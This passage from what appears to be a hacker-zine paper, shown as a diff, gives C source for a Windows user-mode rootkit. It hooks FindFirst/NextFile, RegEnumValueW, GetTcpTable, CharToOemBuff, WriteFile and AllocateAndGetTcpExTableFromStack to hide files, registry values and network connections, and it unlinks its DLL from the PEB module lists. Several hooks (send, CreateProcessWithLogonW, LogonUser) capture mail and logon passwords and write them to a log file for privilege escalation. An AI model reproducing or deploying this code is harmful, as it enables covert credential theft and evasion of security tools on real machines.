+The AINSI and WIDE functions (A/W) of FindFirst/NextFile operate similarly 
+except that the Wide version performs calls to WideCharToMultiByte, in 
+order to convert unicode strings to ainsi.
+
+----------------------   EXAMPLE 5   -----------------------------
+/* MyFindFirstFileA : hides protected files from file listing 
+   (error checks stripped)*/
+HANDLE WINAPI MyFindFirstFileA(
+LPCTSTR lpFileName, 
+LPWIN32_FIND_DATA lpFindFileData)
+{
+	HANDLE hret= (HANDLE)1000;	/* return handle */
+	int go_on=1;			/* loop flag */
+
+	/* Process request */
+	hret = (HANDLE) fFindFirstFileA(lpFileName, lpFindFileData);
+
+	/* Then filter: while we get a 'hidden file', we loop */
+	while( go_on && 
+	  !_strnicmp(lpFindFileData->cFileName, RTK_FILE_CHAR, 
+	  strlen(RTK_FILE_CHAR)))
+	{
+		go_on = fFindNextFileA(hret, lpFindFileData);
+	}
+
+	/* Oops, no more files? */
+	if(!go_on)
+		return INVALID_HANDLE_VALUE;
+
+return hret;
+}
+---------------------- END EXAMPLE 5 -----------------------------
+
+And now let's replace FindNextFileA:
+----------------------   EXAMPLE 6   -----------------------------
+/* MyFindNextFileA : hides protected files from being listed */
+BOOL WINAPI MyFindNextFileA(
+  HANDLE hFindFile,
+  LPWIN32_FIND_DATA lpFindFileData 
+)
+{
+	BOOL ret;	/* return value */
+
+	/* While we get a file that should not be shown, we get another : */
+	do 
+{
+		ret = fFindNextFileA(hFindFile, lpFindFileData);
+	} while( !_strnicmp(lpFindFileData->cFileName, RTK_FILE_CHAR,
+  strlen(RTK_FILE_CHAR)) && ret!=0);
+
+/* We're out of the loop so we may check if we broke because there 
+is no more files. If it's the case, we may clear the 
+LPWIN32_FIND_DATA structure as this : 
+my_memset(lpFindFileData, 0, sizeof(LPWIN32_FIND_DATA));
+	*/
+	return ret;
+}
+---------------------- END EXAMPLE 6 -----------------------------
+
+
+-------[ 4.3. Registry
+Preventing its launch source from being detected is also an unavoidable 
+feature for this kind of rootkit. To allow registry stealth, the rootkit 
+replaces the RegEnumValueW API inside the memory space of all processes.
+The working mode of the new function is simple : if it detects itself 
+listing the content of a key that must be hidden, it returns 1 which 
+traduces an error. The only problem with this implementation is that the 
+calling process will stop asking for the listing of the content of the 
+registry key. Therefore, it will also hide subsequent keys. As the keys 
+are most of the time retrieved alphabetically, the RTK_REG_CHAR traducing 
+that the key is hidden must be starting by a character of high ASCII code 
+so that it will be retrieved last and won't bother.
+
+----------------------   EXAMPLE 7   -----------------------------
+/*  MyRegEnumValue : hide registry keys when a list is requested */
+LONG WINAPI MyRegEnumValue(
+HKEY    hKey,
+DWORD   dwIndex,
+LPWSTR  lpValueName,
+LPDWORD lpcValueName,
+LPDWORD lpReserved,  
+LPDWORD lpType,
+LPBYTE  lpData,
+LPDWORD lpcbData)
+{
+	LONG lRet; /* return value */
+	char buf[256];
+	/* Call genuine API, then process to hiding if needed */
+	lRet = fRegEnumValueW(hKey,dwIndex,lpValueName,lpcValueName,
+    lpReserved, lpType, lpData,lpcbData);
+
+	 /* Convert string from Unicode */
+	WideCharToMultiByte(CP_ACP, 0,lpValueName, -1, buf, 255,NULL, NULL);
+	
+	/* If the key must be hidden... */
+	if(!_strnicmp((char*)buf, RTK_REG_CHAR, strlen(RTK_REG_CHAR))) {
+		lRet=1; /* then return –1 (error) */
+	}
+
+    return lRet;
+}
+---------------------- END EXAMPLE 7 -----------------------------
+
+-------[ 4.4. Netstat like tools.
+Network statistics tools are from far the most vicious. There's a lot of 
+ways to request the list of TCP/UDP used ports and the behavior of the 
+same application (netstat, [TCPVIEW], [FPORT]...) varies from a version of 
+windows to another. This is especially true between NT/2000 and XP where 
+the network statistics start to include the process identifier of the 
+owner of each TCP connection. Whatever the way a process obtains these 
+statistics, some dialog has to be established with the TCP/UDP driver 
+sitting at kernel level (\Device\Tcp and \Device\Udp). This consists in 
+calls to DeviceIoControl to establish a request and receive the answer of 
+the driver. Hooking at this level is possible but from far risky and 
+nightmarish, since the structures and control codes used are undocumented 
+and change between windows versions. So the hooking has to be performed at 
+different level, depending on the quality of the requested information and 
+OS version.
+
+As the rootkit must run under 2000 and XP, we have to consider different 
+cases.
+
+-------[ 4.4.1. The case of windows 2000
+Under windows 2000 the extended API AllocateAndGetTcpExTableFromStack that 
+associates a process identifier with a TCP stream does not exist yet, so 
+information provided by the API doesn't include this reference. 
+
+-------[ 4.4.1.1. Hooking GetTcpTable
+The TCP statistics may officially be obtained by a call to GetTcpTable, 
+which retrieves the TCP connection table (MIB_TCPTABLE).
+
+DWORD GetTcpTable(
+  PMIB_TCPTABLE pTcpTable,
+  PDWORD pdwSize,
+  BOOL border
+);
+
+The functions takes three parameters. The last one, border, decides 
+whether the connection table should be sorted. Then, PdwSize specifies the 
+size of the buffer pointer by the pTcpTable parameter on input. On output, 
+if the buffer is not large enough to hold the returned connection table, 
+the function sets this parameter equal to the required buffer size. 
+Finally, pTcpTable points to a buffer that receives the TCP connection 
+table as a MIB_TCPTABLE structure. A sample retrieving the TCP connection 
+table is available online. [GETTCP]
+
+The MIB_TCPTABLE structure contains a table of TCP connections.
+typedef struct _MIB_TCPTABLE { 
+  DWORD dwNumEntries; 
+  MIB_TCPROW table[ANY_SIZE];
+} MIB_TCPTABLE,  
+*PMIB_TCPTABLE;
+table is a pointer to a table of TCP connections implemented as an array
+of MIB_TCPROW structures, one for each connection.
+
+A MIB_TCPROW stands as follows:
+typedef struct _MIB_TCPROW { 
+  DWORD dwState; 
+  DWORD dwLocalAddr; 
+  DWORD dwLocalPort; 
+  DWORD dwRemoteAddr; 
+  DWORD dwRemotePort;
+} MIB_TCPROW,  
+*PMIB_TCPROW;
+
+While the dwState describes the state of a given connection, dwLocalAddr, 
+dwLocalPort, dwRemoteAddr, dwRemotePort inform about the source and
+destination of the connection. We're interested in dwLocalPort and
+dwRemotePort to determine if the port belongs to the secret range (between
+RTK_PORT_HIDE_MIN and RTK_PORT_HIDE_MAX) and therefore must be hidden.
+To hide a row in TCP table if needed, the MyGetTcpTable function shifts
+the whole array, thus overwriting the unwanted memory zone.
+
+----------------------   EXAMPLE 8   -----------------------------
+/* MyGetTcpTable replacement for GetTcpTable.
+  (error checks stripped)
+*/
+DWORD WINAPI MyGetTcpTable(PMIB_TCPTABLE_ pTcpTable, PDWORD pdwSize, BOOL 
+bOrder)
+{
+	u_long LocalPort=0;   /* remote port on local machine endianness*/
+	u_long RemotePort=0;  /* local port on local machine endianness */
+	DWORD dwRetVal=0, numRows=0; /* counters */
+	int i,j;
+
+	/*Call original function, if no error, strip unwanted MIB_TCPROWs*/
+	dwRetVal = (*fGetTcpTable)(pTcpTable, pdwSize, bOrder);
+	if(dwRetVal == NO_ERROR) 
+	{
+		/* for each row, test if it must be stripped */
+		for (i=0; i<(int)pTcpTable->dwNumEntries; i++) 
+		{
+			LocalPort	= (u_short) fhtons((u_short)
+			   (pTcpTable)->table[i].dwLocalPort);
+
+			RemotePort	= (u_short) fhtons((u_short)
+			   (pTcpTable)->table[i].dwRemotePort);
+	
+			/* If row must be filtered */
+			if( IsHidden(LocalPort, RemotePort) )
+			{
+				/* Shift whole array */
+				for(j=i; j<((int)pTcpTable->dwNumEntries - 1);j++)
+					memcpy( &(pTcpTable->table[i]),
+					 	  &(pTcpTable->table[i+1]),
+					 	  sizeof(MIB_TCPROW_));
+
+				/* Erase last row */
+				memset( &(pTcpTable->table[j]), 
+				          0x00, sizeof(MIB_TCPROW_));
+
+				/* Reduce array size */				
+				(*pdwSize)-= sizeof(MIB_TCPROW_);
+				(pTcpTable->dwNumEntries)--;
+			}	  
+		}
+	}
+
+	return dwRetVal;
+}
+---------------------- END EXAMPLE 8 -----------------------------
+
+Calling GetTcpTable is not the only way to get network statistics under 
+windows 2000. Some programs, such as fport even provide the correspondence
+stream/pid and therefore deal directly with the TCP driver through the 
+DeviceIoControl function. Hijacking this API is not a good idea as I 
+explained before. In consequence, the approach I adopted is to target 
+specific functions used by widespread security tools rather than hooking a 
+level lower by replacing DeviceIoControl.
+
+-------[ 4.4.1.2. Defeating netstat
+In this version of windows, fport isn't the only one that deals directly 
+with the TCP/UDP driver. This is also the case of netstat. To defeat these 
+programs, we just have to replace functions that are involved in network 
+statistic processing from DeviceIoControl call to screen output.
+
+With netstat, the idea is to hook the CharToOemBuffA API that is used to 
+perform characters set translations for each line before it is written to 
+console output.
+
+BOOL CharToOemBuff(       
+    LPCTSTR lpszSrc, /* Pointer to the null-terminated string to 
+			 translate. */
+    LPSTR lpszDst,   /* Pointer to the buffer for the translated 
+			 string.   */
+    DWORD cchDstLength /* Specifies the number of TCHARs to translate */
+);
+
+If the rootkit notices itself being translating a string containing a 
+hidden port, it just calls the function with a blank buffer, so the 
+translation will result in a blank buffer, and output won't show anything.
+
+----------------------   EXAMPLE 9   -----------------------------
+/* MyCharToOemBuffA : replace the function used by nestat to convert  
+strings to a different charset before it sends it to output, so we can get 
+rid of some awkward lines...  :)
+*/
+BOOL WINAPI MyCharToOemBuff(LPCTSTR lpszSrc, LPSTR lpszDst, 
+DWORD cchDstLength)
+{
+	/* If the line contains our port range, we simply get rid of 
+	it. */
+	if(strstr(lpszSrc,(char*)RTK_PORT_HIDE_STR)!=NULL)
+	{
+		/* We call the function, providing a blank string */
+		return (*fCharToOemBuffA)("", lpszDst, cchDstLength); 
+	}
+	return (*fCharToOemBuffA)(lpszSrc, lpszDst, cchDstLength);
+}
+---------------------- END EXAMPLE 9 -----------------------------
+
+As netstat calls the function for each line it writes, there is not 
+problem in avoiding whole ones.
+
+-------[ 4.4.1.2. Defeating Fport
+However, this is not the case of Fport, which processes output character 
+by character. I chose to hook the WriteFile API, and set up a buffer 
+mechanism so output is done line by line, and hiding therefore simpler.
+
+----------------------   EXAMPLE 10  -----------------------------
+/* Convert FPORT.exe's output mode from char by char to line by line to 
+allow hiding of lines containing ports to hide 
+*/
+BOOL WINAPI MyWriteFile(
+  HANDLE hFile,                    /* handle to file to write to */
+  LPCVOID lpBuffer,                /* pointer to data to write to file */
+  DWORD nNumberOfBytesToWrite,     /* number of bytes to write */
+  LPDWORD lpNumberOfBytesWritten,  /* pointer to number of bytes written*/
+  LPOVERLAPPED lpOverlapped        /* pointer to structure for overlapped 
+) 						              I/O*/
+{
+	BOOL bret=TRUE;			/* Return value */
+	char* chr = (char*)lpBuffer;
+	static DWORD total_len=0;		/* static length counter */
+	static char PreviousChars[2048*10];	/* static characters' buffer 
+   (bof?) */
+
+	/* Add the new character */
+	PreviousChars[total_len++] = chr[0];
+	/* Check for line termination */
+	if(chr[0] == '\r') 
+	{
+
+		PreviousChars[total_len] = '\n';
+		PreviousChars[++total_len] = '\0';
+
+		/* show this line only if it contains no hidden port / process 
+		   prefix */
+		if(strstr((char*)PreviousChars,(char*)RTK_PORT_HIDE_STR)==NULL
+			&& strstr((char*)PreviousChars,(char*)RTK_PROCESS_CHAR)==NULL)   
+		{
+			
+			/* Valid line, so process output */
+ 			bret = fWriteFile(hFile, (void*)PreviousChars, 
+ 			    strlen((char*)PreviousChars), 
+ 			    lpNumberOfBytesWritten, 
+ 			    lpOverlapped);
+		}		
+		
+		/* Clear settings */
+		memset(PreviousChars, 0, 2048);
+		total_len= 0;
+	}
+
+	/* fakes the var, so fport can't see output wasn't done */
+	(*lpNumberOfBytesWritten) = nNumberOfBytesToWrite; 
+
+	return bret;
+}
+---------------------- END EXAMPLE 10 -----------------------------
+
+-------[ 4.4.2. The case of windows XP
+Under windows XP programs have not to deal with hell by interacting 
+directly the TCP/UDP driver as the windows API provides sufficient 
+statistics. Thus, the most widespread network tools (netstat, Fport, 
+Tcpview) rely whether on AllocateAndGetTcpExTableFromStack (XP only) or on 
+the classic GetTcpTable depending on the needs. So, to cover the problem 
+under windows XP, the rootkit has just to replace the AllocateAndGetTcpEx
+TableFromStack API. Searching the msdn about this functions is useless. 
+This is an undocumented function. However it exists some useful samples on 
+the web such as [NETSTATP] provided by SysInternals that are quite 
+explicit. The AllocateAndGetTcpExTableFromStack function takes the 
+following parameters.
+
+DWORD AllocateAndGetTcpExTableFromStack( 
+  PMIB_TCPEXTABLE *pTcpTable,	/* buffer for the connection table */
+  BOOL bOrder,				/* sort the table? */
+  HANDLE heap,				/* handle to process heap obtained by 
+   calling GetProcessHeap() */
+  DWORD zero,				/* undocumented */
+  DWORD flags				/* undocumented */
+)
+
+The first parameter is the one interesting. It points to a MIB_TCPEXTABLE 
+structure, that stands for PMIB_TCPTABLE extended, looking as follows.
+
+/* Undocumented extended information structures available 
+   only on XP and higher */
+typedef struct {
+  DWORD   dwState;        /* state of the connection */
+  DWORD   dwLocalAddr;    /* address on local computer */
+  DWORD   dwLocalPort;    /* port number on local computer */
+  DWORD   dwRemoteAddr;   /* address on remote computer */
+  DWORD   dwRemotePort;   /* port number on remote computer */
+  DWORD   dwProcessId;	  /* process identifier */
+} MIB_TCPEXROW, *PMIB_TCPEXROW;
+
+typedef struct {
+	DWORD			dwNumEntries;
+	MIB_TCPEXROW	table[];
+} MIB_TCPEXTABLE, *PMIB_TCPEXTABLE;
+
+This is the same as the structures employed to work with GetTcpTable, so 
+the replacement function's job will be somewhat identical.
+
+----------------------   EXAMPLE 11  -----------------------------
+/*
+AllocateAndGetTcpExTableFromStack replacement. (error checks 
+stripped)
+*/
+DWORD WINAPI MyAllocateAndGetTcpExTableFromStack( 
+  PMIB_TCPEXTABLEE *pTcpTable,
+  BOOL bOrder,
+  HANDLE heap,
+  DWORD zero,
+  DWORD flags
+)
+{
+/* error handler, TcpTable walk index, TcpTable sort index */
+DWORD err=0, i=0, j=0; 
+	char psname[512];	 			/* process name */
+	u_long LocalPort=0, RemotePort=0;	/* local & remote port */
+
+	
+	/* Call genuine function ... */
+	err = fAllocateAndGetTcpExTableFromStack( pTcpTable, bOrder, heap, 
+	zero,flags );
+
+	/* Exit immediately on error */
+	if(err)
+		return err;	
+
+	/* ... and start to filter unwanted rows. This will hide all 
+	opened/listening/connected/closed/... sockets that belong to 
+	secret range or reside in a secret process
+	*/
+	/* for each process... */
+	for(i = 0; i < ((*pTcpTable)->dwNumEntries); j=i) 
+	{
+		/* Get process name to filter secret processes' sockets */
+		GetProcessNamebyPid((*pTcpTable)->table[i].dwProcessId, 
+		(char*)psname);
+		/* convert from host to TCP/IP network byte order 
+        (which is big-endian)*/
+		LocalPort	= (u_short) fhtons((u_short)
+		(*pTcpTable)->table[i].dwLocalPort);
+		RemotePort	= (u_short) fhtons((u_short)
+		(*pTcpTable)->table[i].dwRemotePort);
+
+		/* Decide whether to hide row or not */
+		if(  !_strnicmp((char*)psname, RTK_FILE_CHAR, 
+		     strlen(RTK_FILE_CHAR)) 
+		     ||  IsHidden(LocalPort, RemotePort) )
+		{
+			/* Shift whole array*/
+			for(j=i; j<((*pTcpTable)->dwNumEntries); j++)
+				memcpy( (&((*pTcpTable)->table[j])), 
+				      (&((*pTcpTable)->table[j+1])),
+			           sizeof(MIB_TCPEXROWEx));
+
+			/* clear last row */
+			memset( (&((*pTcpTable)->table[((
+			        (*pTcpTable)->dwNumEntries)-1)])), 
+			         0, sizeof(MIB_TCPEXROWEx));
+			
+			/* decrease row number */
+			((*pTcpTable)->dwNumEntries)-=1;
+			
+
+			/* do the job again for the current row, that may also 
+			   contain a hidden process */
+			continue;
+		}
+
+	 	/* this row was ok, jump to the next */
+		i++;
+	}
+  return err;
+}
+---------------------- END EXAMPLE 11 -----------------------------
+
+These replacement functions reside in kNTINetHide.c.
+
+
+-------[ 4.5. Global TCP backdoor / password grabber
+As the rootkit is injected in almost every user process, there's a 
+possibility to set up a global TCP backdoor by hijacking recv and WSARecv, 
+allowing transforming any application (including a web server), into an 
+opportune backdoor.  This is complicated enough to be a whole project in 
+itself so I focused on a password grabber virtually able to hijack 
+passwords sent by any mail client [kSENTINEL]. Currently, it targets at 
+Outlook and Netscape mail client but may easily be extended to other 
+applications by playing with the #defines. It dynamically hijacks the TCP 
+stream when the mail client deals with remote server. Therefore, it allows 
+to grab USER and PASS commands to be used for later privileges escalation.
+
+----------------------   EXAMPLE 12   -----------------------------
+/* POP3 Password grabber. Replaces the send() socket function.
+*/
+int WINAPI MySend(SOCKET s, const char FAR * buf, int len, int flags)
+{
+	int retval=0;		/* Return value */
+	char* packet;		/* Temporary buffer */
+	
+	if(!fSend)		/* no one lives for ever (error check) */
+		return 0;
+	
+	/* Call original function */
+	retval = fSend(s, buf, len, flags);
+
+	/* packet is a temp buffer used to deal with the buf parameter 
+	   that may be in a different memory segment, so we use the 
+	   following memcpy trick.
+	*/
+	packet = (char*) malloc((len+1) * sizeof(char));
+	memcpy(packet, buf, len);
+	
+	/* Check if memory is readable */
+	if(!IsBadStringPtr(packet, len))	
+	{
+		/* Filter interesting packets (POP3 protocol) */
+		if(strstr(packet, "USER") || strstr(packet, "PASS"))
+		{
+			/* Interesting packet found! */
+
+			/* Write a string to logfile (%user 
+			profile%\NTILLUSION_PASSLOG_FILE) */
+
+			Output2LogFile("'%s'\n", packet);
+		}
+	}
+
+	
+	 free(packet);
+ 
+     return retval;
+}
+---------------------- END EXAMPLE 12 -----------------------------
+
+FTP logins and passwords may also be grabbed by adding the proper 
+expression in the filter condition.
+
+
+-------[ 4.6. Privilege escalation
+Catching POP3 and FTP passwords may allow spreading on the local machine 
+since users often use the same password on different accounts. Anyway when 
+grabbing a password used to login as another user on the machine, there's 
+no doubt that the password will be efficient. Indeed, the rootkit logs 
+attempts to impersonate another user from the desktop. This is the case 
+when the user employs the runas command or selects "the run as user" menu 
+by right clicking on an executable. The API involved in these situations 
+are redirected so any successful login is carefully saved on hard disk for 
+further use. 
+This is achieved through the replacement of LogonUserA and CreateProcess
+WithLogonW.
+
+The runas tool present on windows 2000/XP relies on CreateProcessWith
+LogonW. Its replacement follows.
+
+----------------------   EXAMPLE 13   -----------------------------
+/* MyCreateProcessWithLogonW : collects logins/passwords employed to 
+create a process as a user. This Catches runas passwords. (runas 
+/noprofile /user:MyBox\User cmd)
+*/
+BOOL WINAPI MyCreateProcessWithLogonW(
+LPCWSTR lpUsername,		/* user name for log in request */
+LPCWSTR lpDomain,			/* domain name for log in request */
+LPCWSTR lpPassword,		/* password for log in request */
+DWORD dwLogonFlags,		/* logon options*/
+LPCWSTR lpApplicationName,	/* application name... */
+LPWSTR lpCommandLine,		/* command line */
+DWORD dwCreationFlags,		/* refer to CreateProcess*/
+LPVOID lpEnvironment,		/* environment vars*/
+LPCWSTR lpCurrentDirectory,	/* base directory */
+LPSTARTUPINFOW lpStartupInfo,	/* startup and process infor, see 
+CreateProcess */
+LPPROCESS_INFORMATION lpProcessInfo)
+{
+	BOOL bret=false;	/* Return value */
+	char line[1024];	/* Buffer used to set up log lines */
+
+	/* 1st of all, log on the user */
+	bret = fCreateProcessWithLogonW(lpUsername,lpDomain,lpPassword,
+    dwLogonFlags,lpApplicationName,lpCommandLine,
+	dwCreationFlags,lpEnvironment,lpCurrentDirectory,
+	lpStartupInfo,lpProcessInfo);
+	
+	/* Inject the created process if its name doesn't begin by 
+   RTK_FILE_CHAR (protected process) */
+	/* Stripped [...] */
+
+	/* Log the information for further use */
+	memset(line, 0, 1024);
+	if(bret)
+	{
+		sprintf(line, "Domain '%S' - Login '%S' - Password '%S' – 
+        LOGON SUCCESS", lpDomain, lpUsername, lpPassword);
+	}	
+	else
+	{
+		sprintf(line, "Domain '%S' - Login '%S' - Password '%S' – 
+		LOGON FAILED", lpDomain, lpUsername, lpPassword);
+	}
+
+	/* Log the line */
+	Output2LogFile((char*)line);
+
+  return bret;
+}
+---------------------- END EXAMPLE 13 -----------------------------
+
+Under windows XP, explorer.exe offers a GUI to perform logon operations 
+from the desktop. This relies on LogonUser that may be replaced as below. 
+We're interested only in lpszUsername, lpszDomain and lpszPassword.
+
+----------------------   EXAMPLE 14   -----------------------------
+/* MyLogonUser : collects logins/passwords employed to log on from the 
+local station */
+BOOL WINAPI MyLogonUser(LPTSTR lpszUsername, LPTSTR lpszDomain, LPTSTR 
+lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken)
+{
+	char buf[1024];	/* Buffer used to set up log lines */
+	
+	/* Set up buffer */
+	memset(buf, 0, 1024);
+	sprintf(buf, "Login '%s' / passwd '%s' / domain '%'\n", 
+	lpszUsername, 
+	lpszPassword,
+	lpszDomain);
+	/* Log to disk */
+	Output2LogFile((char*)buf);
+
+	/* Perform LogonUser call */
+	return fLogonUser(lpszUsername, lpszDomain, lpszPassword, 
+	dwLogonType, dwLogonProvider, phToken);
+}
+---------------------- END EXAMPLE 14 -----------------------------
+
+The grabbed data are sent to a log file at user profile's root and may be 
+encrypted using a simple 1 byte XOR key.
+
+
+-------[ 4.7. Module stealth
+As soon as it is loaded into a process, the rootkit hides its DLL. 
+Therefore, if the system does not hook LdrLoadDll or its equivalent at 
+kernel level, it appears that the rookit was never injected into 
+processes. The technique used below is very efficient against all programs 
+that rely on the windows API for enumerating modules. Due to the fact that 
+EnumProcessModules/Module32First/Module32Next/... depend on NtQuerySystem
+Information, and because this technique foils the manner this API 
+retrieves information, there's no way to be detected by this intermediary. 
+This defeats programs enumerating processes' modules such as ListDlls, 
+ProcessExplorer (See [LISTDLLS] and [PROCEXP]), and VICE rootkit detector. 
+[VICE]
+
+The deception is possible in ring 3 since the kernel maintains a list of 
+each loaded DLL for a given process inside its memory space, in userland. 
+Therefore a process may affect himself and overwrite parts of its memory 
+in order to hide one of its module. These data structures are of course 
+undocumented but can be recovered by using the Process Environment Block 
+(PEB), located at FS:0x30 inside each process. The function below returns 
+the address of the PEB for the current process.
+
+----------------------   EXAMPLE 15   -----------------------------
+DWORD GetPEB()
+{
+	DWORD* dwPebBase = NULL;
+	/* Return PEB address for current process
+	   address is located at FS:0x30 */
+		__asm 
+		{
+			push eax
+			mov eax, FS:[0x30]
+			mov [dwPebBase], eax
+			pop eax
+		}
+	return (DWORD)dwPebBase;
+}
+---------------------- END EXAMPLE 15 -----------------------------
+
+The role of the PEB is to gather frequently accessed information for a 
+process as follows. At address FS:0x30 (or 0x7FFDF000) stands the 
+following members of the [PEB].
+
+/* located at 0x7FFDF000 */
+typedef struct _PEB 
+{
+  BOOLEAN                 InheritedAddressSpace;
+  BOOLEAN                 ReadImageFileExecOptions;
+  BOOLEAN                 BeingDebugged;
+  BOOLEAN                 Spare;
+  HANDLE                  Mutant;
+  PVOID                   ImageBaseAddress;
+  PPEB_LDR_DATA           LoaderData;
+  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
+  [...]
+  ULONG                   SessionId;
+} PEB, *PPEB;
+
+The interesting member in our case is PPEB_LDR_DATA LoaderData that 
+contains information filled by the loader at startup, and then when 
+happens a DLL load/unload.
+ 
+typedef struct _PEB_LDR_DATA 
+{
+  ULONG                   Length;
+  BOOLEAN                 Initialized;
+  PVOID                   SsHandle;
+  LIST_ENTRY              InLoadOrderModuleList;
+  LIST_ENTRY              InMemoryOrderModuleList;
+  LIST_ENTRY              InInitializationOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+The PEB_LDR_DATA structure contains three LIST_ENTRY that are part of doubly 
+linked lists gathering information on loaded DLL in the current process.
+InLoadOrderModuleList sorts modules in load order, InMemoryOrderModuleList 
+in memory order, and InInitializationOrderModuleList keeps track of their 
+load order since process start.
+
+These doubly linked list contains pointers to LDR_MODULE inside the parent 
+structure for next and previous module.
+
+typedef struct _LDR_MODULE {
+
+  LIST_ENTRY              InLoadOrderModuleList;
+  LIST_ENTRY              InMemoryOrderModuleList;
+  LIST_ENTRY              InInitializationOrderModuleList;
+  PVOID                   BaseAddress;
+  PVOID                   EntryPoint;
+  ULONG                   SizeOfImage;
+  UNICODE_STRING          FullDllName;
+  UNICODE_STRING          BaseDllName;
+  ULONG                   Flags;
+  SHORT                   LoadCount;
+  SHORT                   TlsIndex;
+  LIST_ENTRY              HashTableEntry;
+  ULONG                   TimeDateStamp;
+
+} LDR_MODULE, *PLDR_MODULE;
+
+In fact, this is not exactly true since LIST_ENTRY have a special 
+behavior. Indeed, the base address of the surrounding object is computed 
+by subtracting the offset of the LIST_ENTRY member from it's address 
+(&LIST_ENTRY), because LIST_ENTRY Flink and Blink members always point to 
+the another LIST_ENTRY inside the list, not to the owner of the list node. 
+This makes it possible to interlink objects in multiple lists without any 
+interference as explains Sven B. Schreiber in Undocumented Windows 2000 
+Secrets. To access InLoadOrderModuleList elements, we don't have to bother 
+about offsets since it is the first element of the LDR_MODULE structure so 
+it just needs to be casted to get a LDR_MODULE from a LIST_ENTRY. In the 
+case of InMemoryOrderModuleList we'll have to subtract sizeof(LIST_ENTRY). 
+Similarly, to access the LDR_MODULE from InInitializationOrderModuleList 
+we just subtract 2*sizeof(LIST_ENTRY).
+The following sample demonstrates how to walk one of these lists and throw 
+a module away according to its name (szDllToStrip).
+
+----------------------   EXAMPLE 16   -----------------------------
+/*  Walks one of the three modules double linked lists referenced by the 
+PEB  (error check stripped)
+ModuleListType is an internal flag to determine on which list to operate :
+LOAD_ORDER_TYPE <---> InLoadOrderModuleList
+MEM_ORDER_TYPE  <---> InMemoryOrderModuleList
+INIT_ORDER_TYPE <---> InInitializationOrderModuleList
+*/
+int WalkModuleList(char ModuleListType, char *szDllToStrip)
+{
+	int i;	/* internal counter */
+	DWORD PebBaseAddr, dwOffset=0;
+	
+	/* Module list head and iterating pointer */
+	PLIST_ENTRY pUserModuleListHead, pUserModuleListPtr;
+	
+	/* PEB->PEB_LDR_DATA*/
+	PPEB_LDR_DATA pLdrData;
+	/* Module(s) name in UNICODE/AINSI*/
+	PUNICODE_STRING pImageName;
+	char szImageName[BUFMAXLEN];
+	
+	/* First, get Process Environment Block */	
+	PebBaseAddr = GetPEB(0);
+
+	/* Compute PEB->PEB_LDR_DATA */
+	pLdrData=(PPEB_LDR_DATA)(DWORD *)(*(DWORD *)(PebBaseAddr + 
+						PEB_LDR_DATA_OFFSET)); 
+
+	/* Init linked list head and offset in LDR_MODULE  structure */
+	if(ModuleListType == LOAD_ORDER_TYPE)
+	{
+		/* InLoadOrderModuleList */
+		pUserModuleListHead = pUserModuleListPtr = 
+		(PLIST_ENTRY)(&(pLdrData->ModuleListLoadOrder));
+		dwOffset = 0x0;
+	} else if(ModuleListType == MEM_ORDER_TYPE)
+	{
+		/* InMemoryOrderModuleList */
+		pUserModuleListHead = pUserModuleListPtr = 
+		(PLIST_ENTRY)(&(pLdrData->ModuleListMemoryOrder));
+		dwOffset = 0x08;
+	} else if(ModuleListType == INIT_ORDER_TYPE)
+	{
+		/* InInitializationOrderModuleList */
+		pUserModuleListHead = pUserModuleListPtr = 
+		(PLIST_ENTRY)(&(pLdrData->ModuleListInitOrder));
+		dwOffset = 0x10;
+	}
+
+	/* Now walk the selected list */	
+	do
+	{
+		/* Jump to next LDR_MODULE structure */
+		pUserModuleListPtr = pUserModuleListPtr->Flink;
+		pImageName = (PUNICODE_STRING)( 
+			     ((DWORD)(pUserModuleListPtr)) +
+			     (LDR_DATA_PATHFILENAME_OFFSET-dwOffset));
+
+        	/* Decode unicode string to lower case on the fly */
+		for(i=0; i < (pImageName->Length)/2 && i<BUFMAXLEN;i++) 
+                  szImageName[i] = LOWCASE(*( (pImageName->Buffer)+(i) ));
+		/* Null terminated string */
+		szImageName[i] = '\0';
+
+		/* Check if it's target DLL */
+		if( strstr((char*)szImageName, szDllToStrip) != 0 )
+		{
+			/* Hide this dll : throw this module away (out of 
+			   the double linked list)
+        		(pUserModuleListPtr->Blink)->Flink = 
+				(pUserModuleListPtr->Flink);
+           		(pUserModuleListPtr->Flink)->Blink = 
+				(pUserModuleListPtr->Blink);
+			/* Here we may also overwrite memory to prevent 
+			   recovering (paranoid only ;p) */
+		}
+	}	while(pUserModuleListPtr->Flink != pUserModuleListHead); 
+
+	return FUNC_SUCCESS;
+}
+---------------------- END EXAMPLE 16 -----------------------------
+
+To process the three linked lists, the rootkit calls the HideDll function 
+below.
+----------------------   EXAMPLE 17   -----------------------------
+int HideDll(char *szDllName)
+{
+	return (	WalkModuleList(LOAD_ORDER_TYPE, szDllName)
+			&&	WalkModuleList(MEM_ORDER_TYPE, szDllName)
+			&&	WalkModuleList(INIT_ORDER_TYPE, szDllName)	);
+}
+---------------------- END EXAMPLE 17 -----------------------------
+
+I never saw this method employed to hide a module but instead to recover 
+the base address of a DLL in elaborated shellcodes [PEBSHLCDE].
+To end with this technique, I'll say that it is from far efficient against 
+ring 3 programs but becomes a little bit ineffective against a personal 
+firewall acting at kernel level, such as Sygate Personal Firewall. This 
+one cannot be defeated using the presented method and analysis of its 
+source code shows as it sets hooks in the kernel syscall table, thereby 
+being informed as soon as a DLL is loaded into any process and subsequent 
+hiding is useless. In a word, personal firewalls are the worst enemies of 
+userland rootkits.
+
+-------[ 5. Ending
+-------[ 5.1. Conclusion
+The mechanisms presented in this paper are the result of long research and
+experimentations. It shows up that ring 3 rootkit are an effective threat
+for nowadays computer systems but may be defeated by a clever analysis of
+the weakpoints they target. So this type of rootkit isn't perfect as data
+may still be detected, even though they're from far more difficult to
+notice. Keep in mind that the most important thing is not to cause
+suspicion, and therefore not be detected. In a word, ring 3 rootkits are
+perfect meantime to get administrative privilege on the local machine and
+install a most adapted ring 0 rootkit that will be more suitable to reach
+the maximum stealth.
+
+
+-------[ 5.2. Greets
+"If I have seen further it is by standing on the shoulders of giants." 
+This quotation from Isaac Newton (1676) perfectly describes the ways 
+things work. Therefore, my thanks first go to all authors that make the 
+internet a place of free information and exchanges. Without them you would 
+probably not be reading these lines. This is especially true for Ivo 
+Ivanov - thanks to you I discovered the world of API hooking -, Crazylord
+who provided me precious information to set up my first device driver,
+Holy_Father and Eclips for considering some questions about userland
+take over. Added to that, I'd like to thank my friends and revisers that
